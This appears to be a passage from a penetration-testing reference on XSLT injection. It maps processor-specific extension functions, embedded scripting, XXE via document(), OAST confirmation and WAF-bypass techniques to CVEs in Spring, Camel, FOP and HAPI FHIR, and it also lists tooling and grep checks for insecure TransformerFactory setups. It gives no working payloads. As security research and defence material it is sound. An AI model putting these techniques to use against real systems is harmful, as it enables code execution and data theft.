- **Processor identity narrows the primitive set.** Xalan/Saxon-PE/EE/libxslt-PHP/.NET-with-EnableScript are all unbounded; Saxon-HE/libxslt-no-PHP/MSXML-defaults/.NET-defaults are all bounded. The library name alone is a strong narrowing signal.
- **`FEATURE_SECURE_PROCESSING` is the Java-side kill switch.** Set to true, Xalan's extension functions and most dangerous behaviors are disabled. Grep Java sources for `TransformerFactory.newInstance()` without a subsequent `setFeature(FEATURE_SECURE_PROCESSING, true)` — the finding is the omitted call.
- **`<msxsl:script>` requires `XsltSettings.EnableScript = true`.** The default is false. CVE write-ups require confirming the application explicitly enabled it.
- **`xml-stylesheet` PI delivery is upload-driven.** The injection point is the file upload; the XSLT is externally hosted. Where an upload surface allows XML, test for PI honoring with OAST.
- **Spring XsltView is a specific affected-range CVE** (CVE-2026-47884 — see version boundaries in novel sibling); grep for `XsltView` references in Spring projects.
- **FOP/Jasper inherits from the underlying XSLT processor.** FOP configured on Xalan has Xalan's reach; FOP on Saxon-HE is bounded.
- **Camel's XSLT component CVE-2026-88789 is a TransformerFactory misconfig.** The extension's own factory doesn't set secure processing — fix is upstream in Camel Quarkus.
- **HAPI FHIR tooling cluster is parse-side XXE, not XSLT injection in the strict sense.** The XSLT configuration is the enabler; the attack is XXE. Primary owner: `xxe.md`.

## Advanced Tooling

- **Saxon-HE / Xalan / libxslt CLIs** — reproduce payloads locally against the pinned processor; essential for verifying processor behavior before firing against the target.
- **xsltproc (libxslt command-line)** — PHP-and-C-side testing.
- **.NET XslCompiledTransform via PowerShell** — Windows-side testing.
- **Spring Boot test app** — spin up a Spring MVC `/**` mapping with `XsltView` configured to reproduce CVE-2026-47884 class.
- **Apache FOP CLI** — test XSL-FO rendering primitives.
- **Burp Collaborator / Interactsh** — `document()` OAST confirmation.
- **xmlstarlet** — XML inspection + payload construction.

The XSLT class has a bounded primitive set — per-processor extension-function reach (Xalan Java-reflection, Saxon-PE/EE reflection, libxslt-PHP `php:function`, .NET `<msxsl:script>`), document()/unparsed-text() external resource load, and XSLT 2.0/3.0 function abuse — each now at full depth; the under-band line count is a finding (five processors × their specific extension-function API, bounded by processor count), not a stop-short.

## Summary

The XSLT advanced tier is the full established technique surface at depth: per-processor extension-function catalogues with full function surface and namespace syntax (Xalan `http://xml.apache.org/xalan/java/`, Saxon `java:` / `http://saxon.sf.net/java-type`, libxslt-PHP `http://php.net/xsl`, .NET `urn:schemas-microsoft-com:xslt`), embedded-scripting primitives (`<msxsl:script>` C#, `saxon:evaluate` dynamic XPath, `xsl:evaluate` XSLT 3.0), XSLT 2.0/3.0 full function surface (doc, unparsed-text, environment-variable, function-lookup, higher-order functions, parse-xml/serialize for node construction), Spring XsltView mechanism class (CVE-2026-47884 — version boundaries in novel sibling), Apache FOP / Jasper / HAPI FHIR / Camel pipeline specifics with inherited processor reach, and WAF/filter bypass as a technique class via namespace variation, function-name obfuscation, computed-string construction, entity-based namespace injection, CDATA wrapping, PI smuggling. Each CVE in `xslt_injection_novel_deep.md` reduces to one of these primitives: attacker-controlled stylesheet with Java-reflection reach (Wicket, GeoNetwork, Camel, XMLUnit, DataStage), `<msxsl:script>` reach (.NET-side CVEs), `document()`-side XXE in a transformation path (HAPI FHIR, langchain-text-splitters), or XSLT delivery via upload / PI (Concrete CMS, Snipe-IT).
